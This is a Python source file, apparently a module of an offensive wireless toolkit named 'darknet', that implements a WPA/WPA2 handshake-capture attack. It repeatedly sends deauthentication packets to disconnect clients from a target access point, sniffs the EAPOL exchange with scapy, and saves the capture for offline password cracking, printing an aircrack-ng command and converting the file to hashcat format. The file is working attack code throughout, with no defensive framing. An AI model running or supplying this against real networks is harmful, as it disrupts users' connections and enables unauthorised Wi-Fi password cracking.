"""
WPA handshake capture module
Captures 4-way handshake for offline cracking
"""

from scapy.all import *
from scapy.layers.eap import EAPOL
from darknet.core.base import AttackModule
from darknet.core.packet import PacketHandler
from darknet.utils.constants import *
from darknet.offensive.deauth import DeauthAttack
import time
from datetime import datetime
import os


class HandshakeCapture(AttackModule):
    """
    Capture WPA/WPA2 4-way handshake
    Optionally deauthenticates clients to force handshake
    """

    def __init__(self):
        super().__init__(
            name="Handshake Capture",
            description="Capture WPA/WPA2 4-way handshake",
            attack_type=ATTACK_HANDSHAKE
        )
        self.ap_mac = None
        self.ap_ssid = None
        self.client_mac = None
        self.channel = None
        self.auto_deauth = True
        self.timeout = 120
        self.packet_handler = None
        self.deauth_attack = None
        self.handshake_packets = []
        self.handshake_complete = False
        self.eapol_count = 0

    def setup(self, **kwargs) -> bool:
        """
        Setup handshake capture
        Args:
            interface: Wireless interface
            ap_mac: Target AP MAC
            ap_ssid: Target AP SSID
            client_mac: Target client MAC (optional)
            channel: Target channel
            auto_deauth: Automatically deauth to trigger handshake
            timeout: Capture timeout in seconds
        """
        try:
            self.interface = kwargs.get('interface')
            self.ap_mac = kwargs.get('ap_mac')
            self.ap_ssid = kwargs.get('ap_ssid')
            self.client_mac = kwargs.get('client_mac')
            self.channel = kwargs.get('channel')
            self.auto_deauth = kwargs.get('auto_deauth', True)
            self.timeout = kwargs.get('timeout', 120)

            if not self.interface or not self.ap_mac:
                self.logger.error("Interface and AP MAC required")
                return False

            self.packet_handler = PacketHandler(self.interface)

            if self.auto_deauth:
                self.deauth_attack = DeauthAttack()
                self.deauth_attack.setup(
                    interface=self.interface,
                    ap_mac=self.ap_mac,
                    client_mac=self.client_mac,
                    packet_count=20,
                    injection_rate=50
                )

            self.logger.info(f"Handshake capture configured:")
            self.logger.info(f"  Target AP: {self.ap_mac}")
            self.logger.info(f"  SSID: {self.ap_ssid}")
            self.logger.info(f"  Channel: {self.channel}")
            self.logger.info(f"  Auto deauth: {self.auto_deauth}")

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _check_handshake(self, packet):
        """Check if packet is part of handshake"""
        try:
            if packet.haslayer(EAPOL) and packet.haslayer(Dot11):
                # Check if from/to target AP
                if packet[Dot11].addr1 == self.ap_mac or packet[Dot11].addr2 == self.ap_mac:
                    self.handshake_packets.append(packet)
                    self.eapol_count += 1

                    self.logger.capture(f"EAPOL packet captured ({self.eapol_count}/4)")

                    # Check if we have all 4 packets
                    if self.eapol_count >= 4:
                        self.handshake_complete = True
                        self.logger.success("Complete 4-way handshake captured!")
                        return True

        except Exception as e:
            self.logger.debug(f"Error checking handshake: {e}")

        return False

    def run(self) -> dict:
        """Execute handshake capture"""
        try:
            self.logger.attack(f"Starting handshake capture for {self.ap_mac}")

            # Set channel
            if self.channel:
                subprocess.run(
                    ['iw', 'dev', self.interface, 'set', 'channel', str(self.channel)],
                    check=True,
                    capture_output=True
                )

            # Start packet capture
            self.packet_handler.add_callback(self._check_handshake)
            self.packet_handler.start_capture()

            start_time = time.time()

            # If auto deauth enabled, deauth clients periodically
            last_deauth = 0

            while not self._stop_event.is_set() and not self.handshake_complete:
                current_time = time.time()

                # Send deauth every 10 seconds
                if self.auto_deauth and (current_time - last_deauth) > 10:
                    self.logger.info("Sending deauth packets to trigger handshake...")
                    self.deauth_attack.run()
                    last_deauth = current_time

                # Check timeout
                if current_time - start_time > self.timeout:
                    self.logger.warning("Handshake capture timeout")
                    break

                time.sleep(1)

            self.packet_handler.stop_capture()

            if self.handshake_complete:
                # Save handshake to file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"handshake_{self.ap_mac.replace(':', '')}_{timestamp}.cap"

                # Save all captured packets including handshake
                wrpcap(filename, self.packet_handler.get_captured_packets())

                self.logger.success(f"Handshake saved to {filename}")
                self.logger.info(f"Use: aircrack-ng {filename} -w wordlist.txt")

                # Also try to save in hccapx format for hashcat
                try:
                    hccapx_file = filename.replace('.cap', '.hccapx')
                    subprocess.run(
                        ['cap2hccapx', filename, hccapx_file],
                        capture_output=True,
                        timeout=10
                    )
                    if os.path.exists(hccapx_file):
                        self.logger.success(f"Hashcat format saved: {hccapx_file}")
                except Exception:
                    pass

                return {
                    'success': True,
                    'handshake_captured': True,
                    'output_file': filename,
                    'ap_mac': self.ap_mac,
                    'ssid': self.ap_ssid,
                    'eapol_packets': self.eapol_count
                }
            else:
                self.logger.warning("Complete handshake not captured")
                return {
                    'success': False,
                    'handshake_captured': False,
                    'eapol_packets': self.eapol_count,
                    'message': 'Complete handshake not captured'
                }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()
        if self.packet_handler:
            self.packet_handler.stop_capture()
        if self.deauth_attack:
            self.deauth_attack.stop()

    def cleanup(self):
        """Cleanup resources"""
        if self.packet_handler:
            self.packet_handler.stop_capture()
        if self.deauth_attack:
            self.deauth_attack.cleanup()
